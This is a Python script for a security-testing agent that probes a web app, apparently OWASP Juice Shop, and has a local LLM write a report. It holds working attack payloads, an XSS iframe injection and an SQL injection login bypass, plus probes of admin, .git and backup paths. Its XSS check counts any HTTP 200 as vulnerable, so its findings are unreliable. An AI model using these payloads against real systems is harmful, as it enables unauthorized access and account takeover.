"""Red Team Agent for security testing - LOCAL LLM VERSION (Docker Ollama via subprocess)"""
import subprocess
import requests
import json
import uuid
import os
import sys
from typing import Optional
from datetime import datetime


# ─────────────────────────────────────────
# Helper: call Ollama inside Docker
# ─────────────────────────────────────────

DOCKER_CONTAINER = "open-webui"   # name shown in `docker ps`
DEFAULT_MODEL    = "llama3.2:latest"
OLLAMA_TIMEOUT   = 300            # seconds


def _ask_ollama(prompt: str, model: str = DEFAULT_MODEL) -> str:
    """Send a prompt to Ollama running inside the Docker container."""
    result = subprocess.run(
        ["docker", "exec", DOCKER_CONTAINER, "ollama", "run", model, prompt],
        capture_output=True, text=True, timeout=OLLAMA_TIMEOUT
    )
    return (result.stdout or result.stderr or "").strip()


# ─────────────────────────────────────────
# Security scanning tools
# ─────────────────────────────────────────

def scan_website(url: str) -> dict:
    """Scan the website and collect headers / basic info."""
    try:
        r = requests.get(url, timeout=10)
        return {
            "status": r.status_code,
            "headers": dict(r.headers),
            "title_snippet": r.text[:200]
        }
    except Exception as e:
        return {"error": str(e)}


def discover_api_endpoints(base_url: str) -> list:
    """Probe common API endpoints."""
    endpoints = [
        "/api/", "/rest/", "/swagger.json", "/api-docs",
        "/rest/products/search", "/graphql", "/v1/", "/v2/"
    ]
    found = []
    for ep in endpoints:
        try:
            r = requests.get(base_url + ep, timeout=5)
            found.append({"endpoint": ep, "status": r.status_code})
        except Exception as e:
            found.append({"endpoint": ep, "error": str(e)})
    return found


def enumerate_directories(base_url: str) -> list:
    """Enumerate common directories and files."""
    paths = [
        "/admin", "/login", "/robots.txt", "/sitemap.xml",
        "/.well-known", "/ftp", "/backup", "/config",
        "/.git", "/uploads", "/static"
    ]
    found = []
    for path in paths:
        try:
            r = requests.get(base_url + path, timeout=5)
            found.append({"path": path, "status": r.status_code})
        except Exception as e:
            found.append({"path": path, "error": str(e)})
    return found


def check_admin_endpoints(base_url: str) -> list:
    """Check for exposed admin endpoints."""
    admin_paths = [
        "/admin",
        "/rest/admin/application-configuration",
        "/rest/admin/application-version",
        "/manager", "/administrator", "/wp-admin"
    ]
    found = []
    for path in admin_paths:
        try:
            r = requests.get(base_url + path, timeout=5)
            found.append({"path": path, "status": r.status_code})
        except Exception as e:
            found.append({"path": path, "error": str(e)})
    return found


def juiceshop_xss_search_alert(base_url: str) -> dict:
    """Test for XSS vulnerability via Juice Shop search route."""
    xss_payload = "<iframe src=\"javascript:alert('xss')\">"
    try:
        r = requests.get(
            base_url + "/rest/products/search",
            params={"q": xss_payload},
            timeout=5
        )
        vulnerable = xss_payload in r.text or r.status_code == 200
        return {
            "payload": xss_payload,
            "status": r.status_code,
            "vulnerable": vulnerable,
            "evidence": r.text[:300] if vulnerable else ""
        }
    except Exception as e:
        return {"error": str(e)}


def juiceshop_sqli_admin_login_bypass(base_url: str) -> dict:
    """Test for SQL injection admin login bypass."""
    sqli_payload = {"email": "' OR 1=1--", "password": "anything"}
    try:
        r = requests.post(
            base_url + "/rest/user/login",
            json=sqli_payload,
            timeout=5
        )
        data = {}
        try:
            data = r.json()
        except Exception:
            pass

        token_received = "authentication" in data or "token" in str(data)
        vulnerable = r.status_code == 200 and token_received

        return {
            "status": r.status_code,
            "token_received": token_received,
            "vulnerable": vulnerable,
            "evidence": str(data)[:300] if vulnerable else ""
        }
    except Exception as e:
        return {"error": str(e)}


# ─────────────────────────────────────────
# Logger (mirrors original AgentLogger)
# ─────────────────────────────────────────

class AgentLogger:
    def __init__(self):
        self.run_id          = str(uuid.uuid4())[:8]
        self.messages        = []
        self.tool_calls      = []
        self.tool_results    = []
        self.accessible_paths = []
        self.xss_found       = False
        self.sqli_found      = False
        self.xss_evidence    = ""
        self.sqli_evidence   = ""
        self.log_data        = {"structured_report": {}, "ai_synopsis": ""}

    def set_run_info(self, url, model, task):
        self.url   = url
        self.model = model
        self.task  = task

    def log_message(self, role, content):
        self.messages.append({"role": role, "content": content})

    def log_tool_call(self, name, args):
        self.tool_calls.append({"tool": name, "args": args})

    def log_tool_result(self, name, result):
        self.tool_results.append({"tool": name, "result": result})
        # Track accessible paths
        if isinstance(result, list):
            for item in result:
                if isinstance(item, dict) and item.get("status") == 200:
                    path = item.get("path") or item.get("endpoint", "")
                    if path:
                        self.accessible_paths.append(path)
        # Track vulnerabilities
        if isinstance(result, dict):
            if result.get("vulnerable"):
                if name == "juiceshop_xss_search_alert":
                    self.xss_found    = True
                    self.xss_evidence = result.get("evidence", "")
                if name == "juiceshop_sqli_admin_login_bypass":
                    self.sqli_found    = True
                    self.sqli_evidence = result.get("evidence", "")

    def save_report(self, final_output: str, synopsis: str) -> str:
        timestamp   = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"security_report_{timestamp}.txt"

        lines = [
            "=" * 70,
            "RED TEAM SECURITY REPORT",
            f"Run ID   : {self.run_id}",
            f"Target   : {getattr(self, 'url', 'N/A')}",
            f"Model    : {getattr(self, 'model', 'N/A')}",
            f"Date     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "=" * 70,
            "",
            "── VULNERABILITY SUMMARY ──",
            f"  XSS  Found : {self.xss_found}",
            f"  SQLi Found : {self.sqli_found}",
            "",
            "── ACCESSIBLE PATHS ──",
        ]
        for p in self.accessible_paths:
            lines.append(f"  {p}")

        lines += [
            "",
            "── TOOL RESULTS ──",
        ]
        for tr in self.tool_results:
            lines.append(f"\n[{tr['tool']}]")
            lines.append(json.dumps(tr["result"], indent=2))

        lines += [
            "",
            "── AI ANALYSIS ──",
            final_output,
            "",
            "── AI SYNOPSIS ──",
            synopsis,
            "",
            "=" * 70,
        ]

        with open(report_file, "w") as f:
            f.write("\n".join(lines))

        return report_file


# ─────────────────────────────────────────
# Core agent runner
# ─────────────────────────────────────────

class RedTeamAgent:
    """Red Team Agent for security testing - LOCAL LLM (Docker Ollama)"""

    def __init__(
        self,
        model: Optional[str] = None,
        website_url: Optional[str] = None,
        logger: Optional[AgentLogger] = None,
        include_hints: bool = False
    ):
        self.model_name  = model or DEFAULT_MODEL
        self.website_url = website_url
        self.logger      = logger or AgentLogger()
        self.include_hints = include_hints

        if website_url:
            self.logger.set_run_info(website_url, self.model_name, "")

    # ── run all tools ──────────────────────────────────────────────────────

    def _run_tools(self) -> dict:
        url = self.website_url
        results = {}
        tool_sequence = [
            ("scan_website",                     scan_website,                    url),
            ("discover_api_endpoints",           discover_api_endpoints,          url),
            ("enumerate_directories",            enumerate_directories,            url),
            ("check_admin_endpoints",            check_admin_endpoints,           url),
            ("juiceshop_xss_search_alert",       juiceshop_xss_search_alert,      url),
            ("juiceshop_sqli_admin_login_bypass",juiceshop_sqli_admin_login_bypass,url),
        ]

        for name, fn, arg in tool_sequence:
            print(f"  🔧 Running: {name}")
            self.logger.log_tool_call(name, {"url": arg})
            try:
                result = fn(arg)
            except Exception as e:
                result = {"error": str(e)}
            self.logger.log_tool_result(name, result)
            results[name] = result
            print(f"  ✓  {name} completed")

        return results

    # ── build the analysis prompt (mirrors original prompt style) ──────────

    def _build_analysis_prompt(self, results: dict, task: Optional[str]) -> str:
        directive = task or (
            f"Test OWASP Juice Shop specifically at {self.website_url}. "
            "Analyse the tool results below. "
            "Write a detailed final report covering: "
            "1) Findings per tool, "
            "2) Vulnerabilities confirmed (XSS / SQLi), "
            "3) Severity (Critical / High / Medium / Low), "
            "4) Recommendations. "
            "Do NOT repeat tool payloads verbatim. "
            "After the report, STOP."
        )

        # Keep the data section short to avoid timeout
        short_results = {
            "scan":  {
                "status": results.get("scan_website", {}).get("status"),
            },
            "api_endpoints_found": [
                e for e in results.get("discover_api_endpoints", [])
                if e.get("status") not in (404, None)
            ][:5],
            "accessible_dirs": [
                d for d in results.get("enumerate_directories", [])
                if d.get("status") not in (404, None)
            ][:5],
            "admin_endpoints": [
                a for a in results.get("check_admin_endpoints", [])
                if a.get("status") not in (404, None)
            ][:5],
            "xss": {
                "vulnerable": results.get("juiceshop_xss_search_alert", {}).get("vulnerable"),
                "status":     results.get("juiceshop_xss_search_alert", {}).get("status"),
            },
            "sqli": {
                "vulnerable":     results.get("juiceshop_sqli_admin_login_bypass", {}).get("vulnerable"),
                "token_received": results.get("juiceshop_sqli_admin_login_bypass", {}).get("token_received"),
            },
        }

        return (
            f"{directive}\n\n"
            f"Tool results summary:\n{json.dumps(short_results, indent=2)}"
        )

    # ── synopsis prompt (mirrors original) ────────────────────────────────

    def _build_synopsis_prompt(self) -> str:
        return (
            "Write a short, high-level synopsis of the security test results for training purposes.\n\n"
            "Rules:\n"
            "- Do NOT include payloads, exact endpoints, or step-by-step reproduction.\n"
            "- Do NOT describe how to exploit anything.\n"
            "- Keep it concise: 3-5 bullet points maximum.\n\n"
            "Focus on:\n"
            "- What the accessible paths suggest about the application surface area.\n"
            "- What types of checks were performed (at a high level).\n"
            "- What indicators were observed and what they imply.\n\n"
            f"Accessible paths : {self.logger.accessible_paths}\n"
            f"XSS found        : {self.logger.xss_found}\n"
            f"SQLi found       : {self.logger.sqli_found}\n"
            f"XSS evidence     : {self.logger.xss_evidence}\n"
            f"SQLi evidence    : {self.logger.sqli_evidence}\n"
        )

    # ── main activate method ───────────────────────────────────────────────

    def activate(self, task: Optional[str] = None, verbose: bool = True) -> dict:
        if not self.website_url:
            raise ValueError("website_url not provided.")

        self.logger.set_run_info(self.website_url, self.model_name, task or "")

        if verbose:
            print(f"🔍 Testing Website : {self.website_url}")
            print(f"🤖 Model           : {self.model_name} (Docker Ollama)")
            print(f"📝 Run ID          : {self.logger.run_id}")
            print("\n🧠 Running security tools...\n")

        # Step 1: run all tools
        results = self._run_tools()

        # Step 2: AI analysis
        if verbose:
            print("\n🤖 Asking LLM to analyse results and write report...")

        analysis_prompt = self._build_analysis_prompt(results, task)
        self.logger.log_message("human", analysis_prompt)

        final_output = _ask_ollama(analysis_prompt, self.model_name)
        self.logger.log_message("ai", final_output)

        if verbose:
            print("✓  LLM analysis complete")
            print("\n🤖 Generating synopsis...")

        # Step 3: synopsis
        synopsis_prompt = self._build_synopsis_prompt()
        synopsis = _ask_ollama(synopsis_prompt, self.model_name)
        self.logger.log_data["ai_synopsis"] = synopsis

        if verbose:
            print("✓  Synopsis complete")

        # Step 4: save report
        report_file = self.logger.save_report(final_output, synopsis)

        if verbose:
            print(f"\n📄 Report saved to: {report_file}")

        # Build structured summary
        structured = {
            "vulnerabilities": (
                (["XSS"] if self.logger.xss_found else []) +
                (["SQLi"] if self.logger.sqli_found else [])
            ),
            "severity": "Critical" if (self.logger.xss_found and self.logger.sqli_found)
                        else "High" if (self.logger.xss_found or self.logger.sqli_found)
                        else "Low",
            "accessible_paths": self.logger.accessible_paths,
        }
        self.logger.log_data["structured_report"] = structured

        return {
            "output":     final_output,
            "report_file": report_file,
            "structured": structured,
            "run_id":     self.logger.run_id,
        }


# ─────────────────────────────────────────
# Public entry-point (matches run_agent.py)
# ─────────────────────────────────────────

def activate_agent(
    website_url: str,
    model: Optional[str] = None,
    task: Optional[str] = None,
    instructions: Optional[str] = None,
    objective: Optional[str] = None,
    scenario: Optional[str] = None,
    open_browser: bool = False,
    use_playwright: bool = False,
    include_hints: bool = False
) -> dict:
    """
    Entry point called by run_agent.py.
    Accepts all parameter names the caller might inject via inspect.
    """
    effective_task = task or instructions or objective or scenario

    logger = AgentLogger()
    agent  = RedTeamAgent(
        model=model,
        website_url=website_url,
        logger=logger,
        include_hints=include_hints
    )
    return agent.activate(task=effective_task)
